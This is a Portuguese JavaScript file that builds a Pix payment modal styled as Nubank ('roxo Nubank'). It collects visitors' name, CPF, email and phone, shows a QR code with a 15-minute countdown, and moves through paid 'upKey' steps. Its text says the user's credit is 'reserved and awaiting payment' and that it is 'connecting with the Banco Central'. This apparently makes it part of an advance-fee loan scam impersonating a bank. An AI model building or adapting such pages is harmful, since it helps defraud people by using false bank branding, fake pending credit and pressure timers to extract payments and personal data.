  if (_pixInFlight) return; // trava clique-duplo: não gera 2 transações
  _pixInFlight = true;
  _pixCurrentUpKey = upKey;

  modal.style.display = 'flex';
  document.getElementById('pix-loading').style.display = 'block';
  document.getElementById('pix-content').style.display = 'none';
  document.getElementById('pix-paid').style.display = 'none';

  var c = _nuCliente();
  if (c.nome) {
    document.getElementById('pix-user-name').textContent = c.nome.split(' ')[0];
    document.getElementById('pix-header-name').style.display = 'block';
  } else {
    document.getElementById('pix-header-name').style.display = 'none';
  }

  var ac = ('AbortController' in window) ? new AbortController() : null;
  var to = ac ? setTimeout(function () { ac.abort(); }, 15000) : null;
  fetch('/api/pix', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ upKey: upKey, nome: c.nome, cpf: c.cpf, email: c.email, phone: c.phone, eid: _nuEid(), utms: getUtms() }),
    signal: ac ? ac.signal : undefined,
  })
    .then(function (r) { if (to) clearTimeout(to); return r.json(); })
    .then(function (data) {
      if (!data.success) { alert('Erro ao gerar o Pix. Tente novamente.'); _pixCloseModal(); return; }

      var msg = PIX_MESSAGES[upKey] || { emoji: '💳', titulo: 'Pagamento via Pix', sub: 'Pague agora e continue o processo.' };
      document.getElementById('pix-msg-emoji').textContent = msg.emoji;
      document.getElementById('pix-msg-titulo').textContent = msg.titulo;
      document.getElementById('pix-msg-sub').textContent = msg.sub;

      var amountFmt = 'R$ ' + Number(data.amount).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
      document.getElementById('pix-amount-display').textContent = amountFmt;

      try { var q = qrcode(0, 'M'); q.addData(data.qrcode); q.make(); document.getElementById('pix-qr-img').src = q.createDataURL(5, 4); }
      catch (e) { document.getElementById('pix-qr-img').src = 'https://api.qrserver.com/v1/create-qr-code/?data=' + encodeURIComponent(data.qrcode) + '&size=188x188&margin=6&bgcolor=ffffff'; }

      document.getElementById('pix-code').value = data.qrcode;
      _pixCurrentTxn = data.txnId;

      document.getElementById('pix-loading').style.display = 'none';
      document.getElementById('pix-content').style.display = 'block';

      _pixStartTimer();
      _pixStartPolling(data.txnId);
    })
    .catch(function () { alert('Erro de conexão. Tente novamente.'); _pixCloseModal(); });
}

function pixCopyCode(btn) {
  var code = document.getElementById('pix-code').value;
  function ok() {
    btn.textContent = '✓ Copiado!';
    setTimeout(function () { btn.textContent = 'Copiar'; }, 2500);
  }
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(code).then(ok).catch(function () { _pixFallbackCopy(ok); });
  } else { _pixFallbackCopy(ok); }
}
window.pixCopyCode = pixCopyCode;

function _pixFallbackCopy(cb) {
  var input = document.getElementById('pix-code');
  input.select(); input.setSelectionRange(0, 99999);
  try { document.execCommand('copy'); } catch (e) {}
  if (cb) cb();
}

function _pixStartTimer() {
  _pixTimerSecs = 900;
  clearInterval(_pixTimerInterval);
  _pixTimerInterval = setInterval(function () {
    _pixTimerSecs--;
    var m = Math.floor(_pixTimerSecs / 60).toString().padStart(2, '0');
    var s = (_pixTimerSecs % 60).toString().padStart(2, '0');
    var el = document.getElementById('pix-timer');
    if (!el) return;
    el.textContent = (_pixTimerSecs > 60 ? '⏳ ' : '⚠️ ') + m + ':' + s;
    if (_pixTimerSecs <= 0) { clearInterval(_pixTimerInterval); clearInterval(_pixPollInterval); el.textContent = '❌ Expirado'; }
  }, 1000);
}

function _pixStartPolling(txnId) {
  clearInterval(_pixPollInterval);
  _pixPollInterval = setInterval(function () {
    fetch('/api/status?id=' + txnId)
      .then(function (r) { return r.json(); })
      .then(function (data) { if (data.paid) _pixConfirmado(); })
      .catch(function () {});
  }, 3000);
}

function _pixConfirmado() {
  clearInterval(_pixPollInterval);
  clearInterval(_pixTimerInterval);
  document.getElementById('pix-content').style.display = 'none';
  document.getElementById('pix-paid').style.display = 'block';
  var up = _pixCurrentUpKey;
  setTimeout(function () { _pixCloseModal(); _nuNext(up); }, 2200);
}

function _pixCloseModal() {
  _pixInFlight = false;
  clearInterval(_pixPollInterval);
  clearInterval(_pixTimerInterval);
  var modal = document.getElementById('pix-modal');
  if (modal) modal.style.display = 'none';
}
window._pixCloseModal = _pixCloseModal;

// Botão "Já fiz o pagamento" — checa na hora.
function pixCheckNow(btn) {
  if (!_pixCurrentTxn) return;
  var msg = document.getElementById('pix-paid-check-msg');
  if (btn) { btn.disabled = true; btn.style.opacity = '.6'; }
  if (msg) { msg.style.display = 'block'; msg.textContent = 'Verificando seu pagamento...'; }
  fetch('/api/status?id=' + _pixCurrentTxn)
    .then(function (r) { return r.json(); })
    .then(function (data) {
      if (data && data.paid) { _pixConfirmado(); }
      else {
        if (msg) msg.textContent = 'Ainda não identificamos. Se já pagou, aguarde alguns segundos que confirma sozinho. ⏳';
        if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
      }
    })
    .catch(function () {
      if (msg) msg.textContent = 'Tente de novo em instantes.';
      if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
    });
}
window.pixCheckNow = pixCheckNow;

/* ─── markup do modal (roxo Nubank) ─── */
document.addEventListener('DOMContentLoaded', function () {
  var style = document.createElement('style');
  style.textContent = [
    '@keyframes pixSpin{to{transform:rotate(360deg)}}',
    '@keyframes pixPulse{0%,100%{opacity:1}50%{opacity:.25}}',
    '@keyframes pixFadeIn{from{opacity:0;transform:translateY(28px)}to{opacity:1;transform:translateY(0)}}',
    '@keyframes pixCheckIn{from{transform:scale(0) rotate(-20deg);opacity:0}to{transform:scale(1) rotate(0);opacity:1}}',
    '@keyframes pixBarLoop{0%{left:-40%;width:40%}60%{left:50%;width:50%}100%{left:110%;width:40%}}',
    '#pix-modal *{box-sizing:border-box;font-family:"Sora",-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;}',
    '#pix-modal-card{animation:pixFadeIn .38s cubic-bezier(.22,.68,0,1.15) forwards;}',
    '#pix-copy-btn:active{transform:scale(.96);}',
  ].join('');
  document.head.appendChild(style);

  var el = document.createElement('div');
  el.id = 'pix-modal';
  el.style.cssText = 'display:none;position:fixed;z-index:99999;inset:0;background:rgba(20,10,30,.78);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);align-items:center;justify-content:center;padding:10px;';
  el.innerHTML = [
    '<div id="pix-modal-card" style="background:#fff;border-radius:26px;width:100%;max-width:430px;box-shadow:0 40px 100px rgba(0,0,0,.45);overflow:hidden;max-height:97vh;overflow-y:auto;">',

    /* HEADER */
    '<div style="background:linear-gradient(140deg,#4b0082 0%,#7E08CA 55%,#820ad1 100%);padding:18px 22px 16px;position:relative;overflow:hidden;">',
    '<div style="position:absolute;top:-40px;right:-40px;width:140px;height:140px;background:rgba(255,255,255,.06);border-radius:50%;"></div>',
    '<div style="display:flex;align-items:center;justify-content:space-between;position:relative;margin-bottom:10px;">',
    '<div style="display:flex;align-items:center;gap:9px;">',
    '<div style="width:34px;height:34px;background:rgba(255,255,255,.14);border:1px solid rgba(255,255,255,.22);border-radius:9px;display:flex;align-items:center;justify-content:center;">',
    '<svg width="18" height="18" fill="none" viewBox="0 0 24 24"><path fill="#fff" d="m15.45 16.52-3.01-3.01c-.17-.17-.45-.17-.62 0L8.8 16.53c-.34.34-.87.89-2.64.89l3.71 3.7a3 3 0 0 0 4.24 0l3.72-3.71c-.91 0-1.67-.18-2.38-.89M8.8 7.47l3.02 3.02c.17.17.45.17.62 0l2.99-2.99c.71-.74 1.52-.91 2.43-.91l-3.72-3.71a3 3 0 0 0-4.24 0l-3.71 3.7c1.76 0 2.3.58 2.61.89"/><path fill="#fff" d="m21.11 9.85-2.25-2.26H17.6c-.54 0-1.08.22-1.45.61l-3 3c-.56.56-1.48.56-2.04 0L8.09 8.17c-.38-.38-.9-.6-1.45-.6H5.17l-2.29 2.3a3 3 0 0 0 0 4.24l2.29 2.3h1.48c.54 0 1.06-.22 1.45-.6l3.02-3.02c.56-.56 1.48-.56 2.04 0l3.01 3.01c.38.38.9.6 1.45.6h1.26l2.25-2.26a3.04 3.04 0 0 0-.02-4.29"/></svg>',
    '</div>',
    '<div>',
    '<div style="color:#fff;font-weight:700;font-size:14px;line-height:1.2;">Pagamento via Pix</div>',
    '<div style="color:rgba(255,255,255,.6);font-size:10.5px;">Confirmação automática e imediata</div>',
    '</div>',
    '</div>',
    '<div id="pix-timer" style="background:rgba(255,255,255,.14);border:1px solid rgba(255,255,255,.2);color:#fff;padding:5px 11px;border-radius:100px;font-size:12px;font-weight:700;white-space:nowrap;">⏳ 15:00</div>',
    '</div>',
    '<div id="pix-header-name" style="display:none;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.14);border-radius:10px;padding:7px 12px;">',
    '<span style="color:rgba(255,255,255,.6);font-size:11px;">Olá, </span>',
    '<span id="pix-user-name" style="color:#f0d9ff;font-size:11px;font-weight:700;"></span>',
    '<span style="color:rgba(255,255,255,.6);font-size:11px;"> — seu crédito está reservado e aguardando pagamento.</span>',
    '</div>',
    '</div>',

    /* LOADING */
    '<div id="pix-loading" style="padding:56px 24px;text-align:center;">',
    '<div style="width:54px;height:54px;border:4px solid #eee;border-top-color:#7E08CA;border-radius:50%;animation:pixSpin .75s linear infinite;margin:0 auto 18px;"></div>',
    '<p style="color:#111;font-size:15px;margin:0 0 5px;font-weight:700;">Gerando seu Pix...</p>',
    '<p style="color:#9ca3af;font-size:13px;margin:0;">Conectando com o Banco Central</p>',
    '</div>',

    /* CONTEÚDO */
    '<div id="pix-content" style="display:none;">',
    '<div style="padding:16px 20px 0;">',
    '<div style="background:linear-gradient(135deg,#f5e9ff,#efe0ff);border:1px solid rgba(126,8,202,.18);border-radius:14px;padding:13px 15px;display:flex;gap:10px;align-items:flex-start;">',
    '<span id="pix-msg-emoji" style="font-size:22px;line-height:1;flex-shrink:0;margin-top:1px;"></span>',
    '<div>',
    '<div id="pix-msg-titulo" style="font-size:13.5px;font-weight:700;color:#4b0082;margin-bottom:3px;line-height:1.3;"></div>',
    '<div id="pix-msg-sub" style="font-size:12px;color:#374151;line-height:1.55;"></div>',
    '</div>',
    '</div>',
    '</div>',
    '<div style="padding:14px 20px 0;text-align:center;">',
    '<div style="display:inline-flex;align-items:baseline;gap:6px;background:#faf7ff;border:2px solid #eee;border-radius:14px;padding:10px 22px;">',
    '<span style="font-size:12px;color:#6b7280;font-weight:500;">Total a pagar:</span>',
    '<span id="pix-amount-display" style="font-size:24px;font-weight:800;color:#111;letter-spacing:-.5px;"></span>',
    '</div>',
    '</div>',
    '<div style="padding:14px 20px 0;">',
    '<div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">',
    '<div style="flex:1;height:1px;background:#f0f0f0;"></div>',
    '<span style="font-size:10.5px;color:#9ca3af;white-space:nowrap;">Escaneie o QR Code</span>',
    '<div style="flex:1;height:1px;background:#f0f0f0;"></div>',
    '</div>',
    '<div style="text-align:center;">',
    '<div style="display:inline-block;background:#fff;border:2px solid #eee;border-radius:18px;padding:10px;">',
    '<img id="pix-qr-img" src="" alt="QR Code Pix" width="188" height="188" style="display:block;border-radius:10px;">',
    '</div>',
    '</div>',
    '</div>',
    '<div style="padding:14px 20px 0;">',
    '<div style="display:flex;align-items:center;gap:6px;margin-bottom:8px;">',
    '<div style="flex:1;height:1px;background:#f0f0f0;"></div>',
    '<span style="font-size:10.5px;color:#9ca3af;white-space:nowrap;padding:0 6px;">ou use o código Pix Copia e Cola</span>',
    '<div style="flex:1;height:1px;background:#f0f0f0;"></div>',
    '</div>',
    '<div style="display:flex;gap:8px;">',
    '<input id="pix-code" type="text" readonly style="flex:1;min-width:0;padding:11px 13px;border:1.5px solid #eee;border-radius:12px;font-size:10.5px;color:#374151;background:#fafafa;font-family:monospace;outline:none;" value="">',
    '<button id="pix-copy-btn" onclick="pixCopyCode(this)" style="background:linear-gradient(135deg,#7E08CA,#820ad1);color:#fff;border:none;border-radius:12px;padding:11px 17px;font-weight:700;cursor:pointer;font-size:13px;white-space:nowrap;box-shadow:0 3px 10px rgba(126,8,202,.3);">Copiar</button>',
    '</div>',
    '</div>',
    '<div style="padding:14px 20px;">',
    '<div style="background:#f5e9ff;border:1.5px solid #e3ccff;border-radius:14px;padding:12px 14px;overflow:hidden;position:relative;">',
    '<div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;">',
    '<span style="display:inline-block;width:8px;height:8px;background:#7E08CA;border-radius:50%;animation:pixPulse 1.4s ease-in-out infinite;"></span>',
    '<span style="font-size:12.5px;color:#4b0082;font-weight:600;">Verificando pagamento automaticamente...</span>',
    '</div>',
    '<div style="height:3px;background:#e3ccff;border-radius:3px;overflow:hidden;position:relative;">',
    '<div style="position:absolute;height:100%;background:linear-gradient(90deg,#7E08CA,#a94ae0,#7E08CA);border-radius:3px;animation:pixBarLoop 2.2s ease-in-out infinite;"></div>',
    '</div>',
    '</div>',
    '</div>',
    '<div style="padding:0 20px 6px;">',
    '<button id="pix-paid-check" type="button" onclick="pixCheckNow(this)" style="width:100%;background:#fff;border:1.6px solid #7E08CA;color:#4b0082;border-radius:12px;padding:12px;font-weight:800;font-size:13.5px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:7px;">',
    '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg> Já fiz o pagamento',
    '</button>',
    '<div id="pix-paid-check-msg" style="display:none;text-align:center;font-size:11.5px;color:#6b7280;margin-top:7px;line-height:1.4;"></div>',
    '</div>',
    '<div style="padding:0 20px 18px;display:flex;justify-content:center;gap:18px;flex-wrap:wrap;border-top:1px solid #f3f4f6;padding-top:14px;font-size:10.5px;color:#6b7280;">',
    '<span>🔒 Ambiente 100% seguro</span><span>⚡ Confirmação na hora</span>',
    '</div>',
    '</div>',

    /* PAGO */
    '<div id="pix-paid" style="display:none;padding:56px 24px;text-align:center;">',
    '<div style="width:84px;height:84px;background:linear-gradient(135deg,#e3ccff,#c99bf0);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 22px;box-shadow:0 12px 32px rgba(126,8,202,.3);">',
    '<svg width="42" height="42" fill="none" stroke="#4b0082" viewBox="0 0 24 24" style="animation:pixCheckIn .45s cubic-bezier(.22,.68,0,1.2) both;"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/></svg>',
    '</div>',
    '<h3 style="margin:0 0 6px;color:#111;font-size:22px;font-weight:800;">Pagamento confirmado!</h3>',
    '<p style="color:#6b7280;font-size:14px;margin:0 0 24px;line-height:1.5;">Obrigado! Avançando para a próxima etapa...</p>',
    '<div style="display:flex;align-items:center;justify-content:center;gap:7px;">',
    '<div style="width:8px;height:8px;background:#7E08CA;border-radius:50%;animation:pixPulse .6s ease-in-out infinite;"></div>',
    '<div style="width:8px;height:8px;background:#7E08CA;border-radius:50%;animation:pixPulse .6s .15s ease-in-out infinite;"></div>',
    '<div style="width:8px;height:8px;background:#7E08CA;border-radius:50%;animation:pixPulse .6s .3s ease-in-out infinite;"></div>',
    '</div>',
    '</div>',

    '</div>',
  ].join('');
  document.body.appendChild(el);
});
